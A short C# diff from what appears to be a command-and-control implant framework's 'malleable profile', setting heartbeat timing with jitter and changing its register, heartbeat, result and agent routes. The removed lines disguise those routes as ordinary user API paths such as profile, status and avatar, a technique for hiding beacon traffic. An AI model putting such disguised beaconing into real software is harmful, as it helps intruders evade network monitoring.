@@ -14,10 +14,10 @@ public class DefaultProfile : IMalleableProfile
     public int HeartbeatIntervalSeconds => 30;
     public double JitterPercent => 0.2;
 
-    public string GetRegisterUrl(string baseUrl) => $"{baseUrl}/api/v1/user/profile";
-    public string GetHeartbeatUrl(string baseUrl) => $"{baseUrl}/api/v1/user/status";
-    public string GetResultUrl(string baseUrl) => $"{baseUrl}/api/v1/user/avatar";
-    public string GetWebSocketUrl(string baseUrl) => $"{baseUrl}/ws/chat";
+    public string GetRegisterUrl(string baseUrl) => $"{baseUrl}/register";
+    public string GetHeartbeatUrl(string baseUrl) => $"{baseUrl}/heartbeat";
+    public string GetResultUrl(string baseUrl) => $"{baseUrl}/result";
+    public string GetWebSocketUrl(string baseUrl) => $"{baseUrl}/agent";
 
     public Dictionary<string, string> GetRequestHeaders() => new()
     {
